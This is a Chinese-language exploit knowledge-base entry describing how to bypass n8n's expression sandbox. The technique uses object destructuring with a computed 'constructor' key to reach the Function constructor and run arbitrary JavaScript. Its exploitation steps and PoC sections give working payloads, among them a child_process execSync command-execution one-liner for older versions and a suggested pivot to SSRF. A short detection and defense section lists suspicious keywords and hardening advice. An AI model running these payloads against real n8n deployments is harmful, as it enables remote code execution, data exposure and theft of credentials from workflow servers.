---
id: web-nodejs-n8n-object-destructuring-computed-key-ast-bypass
title: n8n 表达式沙箱补丁绕过：对象解构计算属性键欺骗 AST，原型链取 Function 构造器执行任意 JS（CVE-2026-25049 变体）
type: scenario
domain: web
path: web/nodejs
technique: n8n-object-destructuring-computed-key-ast-bypass
aliases:
- CVE-2026-25049 绕过
- n8n 对象解构绕过
- 计算属性键绕过 AST
- 解构 constructor
- Function 构造器沙箱逃逸
- PrototypeSanitizer 绕过
- n8n 1.123.17
tags:
- n8n
- nodejs
- sandbox-escape
- expression-injection
- ast-bypass
- object-destructuring
- computed-property
- function-constructor
- vm2
- cve-2026-25049
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: n8n 1.123.17 - 1.123.20（原文；2.6.4 仅剩 helpers.httpRequest 网络访问）
verification:
  verified_by: verifier-V151
  verified_at: '2026-11-06T07:33:16+08:00'
  notes: 已对照原文与14张图核对：Patch 1 的 FunctionThisSanitizer/EMPTY_CONTEXT 与 unsafeObjectProperties 新增 mainModule/binding/_load（图08-10）、Patch 2 的 with 禁用与 vm2 回退（图11）、1.123.17 下计算属性键解构取 Object/Function 构造器并执行 process.version=22.21.0、pid=8、cwd=/home/node（图12/13）、2.6.4 仅 helpers.httpRequest 与 1.123.17-1.123.20 完整逃逸（图01/14）均一致；1.121.0 的 IIFE this.process.mainModule.require 链亦与图06/07一致。原文明确给出 1.123.17-1.123.20 区间，affected_versions 已正确设置。未验证点：未在本地复跑 n8n 环境；原文新发现的绕过未获 CVE 编号，cve 留空正确。
---

## 一句话结论

n8n 在 CVE-2025-68613 后用 AST 黑名单拦截 `constructor`/`process`/`mainModule` 等属性，但只检查 `MemberExpression` 的静态属性名；用对象解构的计算属性键 `const { [c]: O } = {}`（`c = "con" + "structor"`）可让 AST 阶段拿不到 keyName 而默认放行，运行时取到 `Object` 构造器，再沿 `Object.constructor` 取到 `Function` 构造器，`Function(code)()` 即可在宿主上下文执行任意 JavaScript；原文在 n8n 1.123.17–1.123.20 验证可读 `process.version/pid/cwd/platform`、遍历原型链并执行 `new Function`，2.6.4 仅剩 `helpers.httpRequest` 网络访问。

## 原理

- **AST 黑名单的假设**：`PrototypeSanitizer`/`unsafeObjectProperties` 通过遍历 AST 的 `MemberExpression` 节点，取出 `obj.xxx` / `obj["xxx"]` 中的属性名，再与 `__proto__`、`prototype`、`constructor`、`getPrototypeOf`、`mainModule`、`binding`、`_load` 等黑名单比较。
- **计算属性键的盲区**：对象解构 `const { [expr]: target } = source` 的 `Property` 节点 `computed=true`，其 key 是一个表达式而不是字符串字面量；静态分析阶段无法把 `c = "con" + "structor"` 折叠成 `constructor`，keyName 往往是 `undefined`。不少实现遇到无法识别的 key 就走“默认安全/放行”分支，黑名单因此被短路。
- **原型链取构造器**：
  - `const { [c]: O } = {}` 等价于 `O = ({}).constructor`，即 `Object` 构造器；
  - `const { [c]: F } = O` 等价于 `F = Object.constructor`，即 `Function` 构造器；
  - `F("return process.version")()` 用宿主 `Function` 构造器编译并执行代码；函数体在全局作用域运行，可访问 `process`、`Object` 等宿主对象。
- **为什么补丁没拦住**：Patch 1 的 `FunctionThisSanitizer` 只处理 `this` 绑定（IIFE 改 `.call(EMPTY_CONTEXT)`、函数表达式 `.bind(EMPTY_CONTEXT)`），本链路根本不使用 `this`；Patch 2 禁用 `with` 并把沙箱切回 vm2，但对象解构 + 计算键仍能绕过 AST 属性检查。根因是“静态分析 vs 动态语言”：AST 看到的是未知计算过程，运行时看到的是确定的 `constructor`。
- **边界**：在 n8n 2.6.4 中，绕过仍可行，但逃逸后的能力被限制为 `helpers.httpRequest` 网络访问，任意代码执行与 `process.env` 读取被收紧；1.x 的 1.123.17–1.123.20 仍存在完整沙箱逃逸（任意 JS + 环境变量/进程信息）。原文 PoC 执行了任意 JS 与 `process.*` 读取，但未在后补丁环境演示 `require`/系统命令；前置版本（CVE-2025-68613）可用 `this.process.mainModule.require('child_process')` 直接 RCE。

## 触发条件

- n8n 1.123.17–1.123.20（原文 1.x 分支仍可完整逃逸）；更早的 1.x 可能同时受 CVE-2025-68613 影响。
- 攻击者拥有可创建/编辑工作流或节点表达式的账号（管理员、被伪造的 admin JWT、或被劫持的会话）。
- 目标节点使用表达式求值（如 Set/Edit Fields 的 `{{ ... }}` 或 Code 节点的 JavaScript），且沙箱未禁用对象解构/计算属性。
- 表达式返回值会出现在执行结果/日志中，便于读取泄漏的 `process` 信息。

## 利用步骤

1. 确认版本与入口：n8n 1.123.17–1.123.20，能编辑工作流表达式。
2. 添加 Manual Trigger + Edit Fields (Set) 节点，在字段值中填入表达式 payload。
3. 用对象解构 + 计算键取构造器：
   ```js
   const c = "con" + "structor";
   const { [c]: ObjectConstructor } = {};
   const { [c]: FunctionConstructor } = ObjectConstructor;
   const attack = FunctionConstructor("return {node: process.version, pid: process.pid, cwd: process.cwd()}");
   return attack();
   ```
4. 执行节点，确认返回 JSON 中包含真实 `process` 信息；若返回被拦截，尝试其他等价语法（`({ [c]: x } = {})`、`Reflect.get`、`Object.getOwnPropertyDescriptor`）。
5. 在受影响更早的版本上，把 `FunctionConstructor` 的内容换成 `this.process.mainModule.require('child_process').execSync('id').toString()` 验证系统命令执行。
6. 后补丁 2.x 中若仅剩 `helpers.httpRequest`，可转向 SSRF/内网探测；不要假设一定拿到 RCE，按实际版本评估。

## PoC

最小验证（对象解构 + 计算键 + Function 构造器）：

```js
const c = "con" + "structor";
const { [c]: ObjectConstructor } = {};
const { [c]: FunctionConstructor } = ObjectConstructor;

const attack = FunctionConstructor(`
  return {
    proof: "ARBITRARY_CODE_EXECUTION_DEMONSTRATED",
    node: process.version,
    pid: process.pid,
    cwd: process.cwd(),
    platform: process.platform
  };
`);

return attack();
```

原文完整 PoC 还包含 `Object.getPrototypeOf` 原型链遍历、`new Function(...)` 二次代码生成与 CPU 循环；核心就是上面的 `{} → constructor → Object → constructor → Function`。在 n8n 1.121.0 等未打 Patch 1 的版本，直接使用：

```js
{{ (function(){ return this.process.mainModule.require('child_process').execSync('id').toString() })() }}
```

## 变体与关联

- 变体：其他动态取属性的写法：`({ [c]: x } = obj)`、`const { [Symbol.for('constructor')]: x } = {}`、`Reflect.get(obj, c)`、`Object.getOwnPropertyDescriptor`；核心是让 AST 拿不到静态 key。
- 变体：`with` 语句（Patch 2 已禁用）、Proxy、`Error.prepareStackTrace` 等 vm2 历史逃逸链；vm2 已停止维护，存在多个 CVSS 10.0 逃逸。
- 关联：[[web-nodejs-n8n-expression-sandbox-escape-rce]]（CVE-2025-68613：`this.process.mainModule.require` 直接 RCE）；[[web-nodejs-n8n-encryptionkey-jwt-forgery-admin-takeover]]（获取 admin 会话的前置路径）；[[binary-pwn-sandbox-escape-nodejs-vm-constructor-constructor]]（Node vm `constructor.constructor` 逃逸的同类原理）。
- 关联：AI/自动化平台普遍允许用户写表达式或代码，静态 AST 黑名单容易被动态语法绕过；评估时应看执行隔离（独立进程/容器、无宿主对象）而不是关键字列表。

## 检测与防御

- 防御：不要依赖 AST 属性黑名单作为沙箱边界；表达式求值放在独立进程/容器中，使用最小权限用户、无网络/只读文件系统，限制 CPU/内存。
- 防御：升级到已修复版本（2.x 最新；1.x 已 EOL）；1.123.17–1.123.20 用户应尽快升级，不能只依赖 Patch 1/2。
- 防御：限制可编辑表达式的账号；对表达式做 allowlist（只允许 `$json`、`$node` 等白名单对象与方法），禁用对象解构、计算属性、`Function`/`eval`/`Reflect`/`Proxy` 等高危语法。
- 检测：工作流表达式中出现 `constructor`、`Function(`、`Reflect`、`__proto__`、`mainModule`、`child_process`、`process.` 等特征，尤其是字符串拼接/计算属性形式；监控 Create/Update Workflow 与 Execute Workflow 的异常组合。
- 响应：禁用可疑工作流与账号、升级版本、审计表达式执行记录与容器内进程；轮换 n8n encryptionKey 与数据库/第三方凭据。
